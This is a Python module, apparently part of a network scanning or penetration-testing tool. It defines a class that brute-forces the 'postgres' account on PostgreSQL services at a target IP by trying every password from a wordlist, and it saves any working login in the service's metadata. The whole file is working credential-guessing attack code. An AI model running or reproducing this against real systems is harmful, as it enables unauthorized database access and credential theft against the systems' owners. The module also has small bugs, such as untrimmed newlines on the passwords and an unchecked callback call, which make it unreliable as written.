from dataclasses import dataclass
from functools import cached_property
from typing import Callable

import psycopg2

from app.schemes import Service


@dataclass
class BrutePSQLService:
    ip: str
    services: list[Service]
    handle_progress_logs: Callable[[str, float], None] = None

    @cached_property
    def passwords(self) -> list[str]:
        with open("passwords.txt") as f:
            return f.readlines()

    def _connect(self, password: str, port: int):
        psycopg2.connect(
            user="postgres",
            password=password,
            host=str(self.ip),
            port=str(port),
            database="postgres",
        ).cursor()

    def _brute_psql_password(self, service: Service):
        for password in self.passwords:
            try:
                self._connect(password, service.port)
            except Exception:
                pass
            else:
                service.meta = {
                    "login": "postgres",
                    "password": password,
                }
                break

    def start(self) -> list[Service]:
        progress = 0
        self.handle_progress_logs("Starting psql bruteforce", progress)
        total_services = len(self.services)
        for service in self.services:
            if service.name == "postgresql":
                self._brute_psql_password(service)
            progress += 1 / total_services
            if callable(self.handle_progress_logs):
                self.handle_progress_logs("", progress)
        return self.services
